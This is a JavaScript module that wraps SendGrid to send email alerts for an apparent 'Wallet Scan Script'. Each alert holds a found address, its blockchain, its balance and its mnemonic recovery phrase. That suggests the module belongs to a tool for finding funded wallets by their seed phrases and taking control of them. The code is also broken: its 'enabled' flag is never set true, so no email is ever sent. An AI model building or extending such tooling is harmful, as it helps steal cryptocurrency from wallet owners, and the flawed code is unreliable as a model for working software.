const sgMail = require('@sendgrid/mail')
const env = require('./env')

class SendGrid {
  constructor() {
    if (!env.SENDGRID_API_KEY) {
      console.log('No Sendgrid API key found. This function is disabled.')
      this.enabled = false
    }
    this.sendGrid = sgMail.setApiKey(env.SENDGRID_API_KEY)
    this.message = {
      to: null,
      from: null,
      subject: '[Wallet Scan Script] - New wallet found',
      text: '',
    }
  }

  async sendEmail(_message) {
    try {
      if (!this.enabled) return
      this.message.text = `The address ${_message.address} on the ${_message.blockchain} blockchain has a balance of ${_message.balance}.\nThe mnemonic phrase is: ${_message.mnemonic}`
      await this.sendGrid.send(this.message)
    } catch (error) {
      throw new Error('Cannot send email', _message)
    }
  }
}

module.exports = { SendGrid }
